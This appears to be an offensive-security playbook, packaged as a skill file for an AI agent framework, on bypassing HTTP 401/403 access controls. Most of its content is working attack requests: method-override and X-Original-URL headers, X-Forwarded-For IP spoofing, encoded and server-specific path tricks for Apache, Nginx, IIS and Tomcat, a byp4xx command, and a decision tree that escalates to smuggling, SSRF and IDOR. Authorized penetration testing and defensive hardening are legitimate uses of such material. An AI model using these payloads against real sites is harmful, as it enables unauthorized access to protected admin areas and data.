# SKILL: 401/403 Bypass Techniques — Expert Attack Playbook: detailed technique reference

<!-- zhiyugo:resource:start -->
> ZhiyuGo reference material only. Inspect it explicitly through catalog resource tooling when the main Skill names this file; examples do not grant tools, authorization, or evidence.
<!-- zhiyugo:resource:end -->

<!-- zhiyugo:toc:start -->
## Contents

- [5. VERB TAMPERING + PATH COMBINATION](#5-verb-tampering-path-combination)
- [6. TECHNOLOGY-SPECIFIC BYPASSES](#6-technology-specific-bypasses)
- [7. AUTOMATED TOOLS](#7-automated-tools)
- [8. DECISION TREE](#8-decision-tree)
- [9. QUICK REFERENCE — KEY PAYLOADS](#9-quick-reference-key-payloads)
<!-- zhiyugo:toc:end -->

## 5. VERB TAMPERING + PATH COMBINATION

Combine multiple techniques for higher success rate:

```http
POST / HTTP/1.1                          # method override + URL rewrite
X-Original-URL: /admin
X-HTTP-Method-Override: GET

GET /%61dmin HTTP/1.1                    # IP spoof + path encoding
X-Forwarded-For: 127.0.0.1

GET /Admin HTTP/1.0                      # protocol + case + IP spoof
X-Forwarded-For: 127.0.0.1
```

---

## 6. TECHNOLOGY-SPECIFIC BYPASSES

| Server | Key Tricks |
|---|---|
| **Apache** | `/admin/` (trailing slash), `/.admin` (dot prefix), `/admin%0d` (CR) |
| **Nginx** | `/Admin` (case), `/admin../` (normalization), `X-Original-URL: /admin` |
| **IIS/ASP.NET** | `/admin;.css` (path param+ext), `/admin\` (backslash), `/admin::$DATA` (ADS), `/admin%20` |
| **Tomcat/Java** | `/admin;foo` (path param), `/admin..;/` (traversal), `/;/admin` (empty param) |
| **Spring** | `/admin.anything` (suffix matching, older), `/admin/` (trailing slash) |

---

## 7. AUTOMATED TOOLS

| Tool | Purpose | URL |
|---|---|---|
| **byp4xx** | Comprehensive 403 bypass scanner | github.com/lobuhi/byp4xx |
| **403bypasser** | Automated header/path/method bypass | github.com/sting8k/403bypasser |
| **dirsearch** | Directory brute-force with encoding variants | github.com/maurosoria/dirsearch |
| **feroxbuster** | Recursive content discovery | github.com/epi052/feroxbuster |
| **Burp Intruder** | Custom payload lists for manual testing | portswigger.net |

### byp4xx usage

```bash
# Basic usage
./byp4xx.sh https://target.com/admin

# Output shows all attempted bypasses and their response codes
# 200/301/302 responses = potential bypass found
```

---

## 8. DECISION TREE

```
Got 401 or 403 on a path?
│
├── Try PATH MANIPULATION first (highest success rate)
│   ├── /path/      (trailing slash)
│   ├── /PATH       (case change)
│   ├── /path%20    (trailing space)
│   ├── /./path     (dot segment)
│   ├── //path      (double slash)
│   ├── /path;x     (path parameter — Java/Tomcat)
│   ├── /path..;/   (Tomcat specific)
│   ├── /%2e/path   (encoded dot)
│   ├── /path%00    (null byte)
│   ├── /path%23    (encoded hash)
│   └── Result? → 200 = bypass found
│
├── Path tricks failed → Try METHOD BYPASS
│   ├── POST/PUT/PATCH/DELETE/OPTIONS
│   ├── HEAD (same as GET without body)
│   ├── X-HTTP-Method-Override: PUT
│   └── TRACE (may reflect auth headers — XST)
│
├── Method tricks failed → Try HEADER BYPASS
│   ├── X-Original-URL: /path      (Nginx/IIS rewrite)
│   ├── X-Rewrite-URL: /path       (same concept)
│   ├── X-Forwarded-For: 127.0.0.1 (IP whitelist)
│   ├── X-Real-IP: 127.0.0.1
│   ├── True-Client-IP: 127.0.0.1
│   └── Referer: https://target.com/path
│
├── Header tricks failed → Try PROTOCOL BYPASS
│   ├── HTTP/1.0 instead of 1.1
│   ├── HTTP/2 h2c smuggling (../http2-specific-attacks/)
│   └── WebSocket upgrade
│
├── Single techniques failed → Try COMBINATIONS
│   ├── Method + Path: POST /PATH/
│   ├── Header + Path: X-Forwarded-For + /path%20
│   ├── All three: POST + X-Original-URL + IP headers
│   └── Protocol + Path: HTTP/1.0 + encoded path
│
├── All bypasses failed → Consider ALTERNATIVE APPROACHES
│   ├── Request smuggling (../request-smuggling/) → smuggle past ACL
│   ├── SSRF (../ssrf-server-side-request-forgery/) → access from server
│   ├── IDOR (../idor-broken-object-authorization/) → access data directly
│   └── Auth flaws (../authbypass-authentication-flaws/) → login bypass
│
└── Automated scan with byp4xx / 403bypasser for completeness
```

---

## 9. QUICK REFERENCE — KEY PAYLOADS

```http
# Top 10 quick-wins (try these first)
GET /admin/     HTTP/1.1        # trailing slash
GET /Admin      HTTP/1.1        # case change
GET /admin%20   HTTP/1.1        # trailing space
GET /./admin    HTTP/1.1        # dot segment
GET //admin     HTTP/1.1        # double slash
POST /admin     HTTP/1.1        # method change
GET / HTTP/1.1                  # X-Original-URL bypass
X-Original-URL: /admin
GET /admin HTTP/1.1             # IP whitelist bypass
X-Forwarded-For: 127.0.0.1
GET /admin;.css HTTP/1.1        # IIS path param
GET /admin..;/ HTTP/1.1         # Tomcat bypass
```
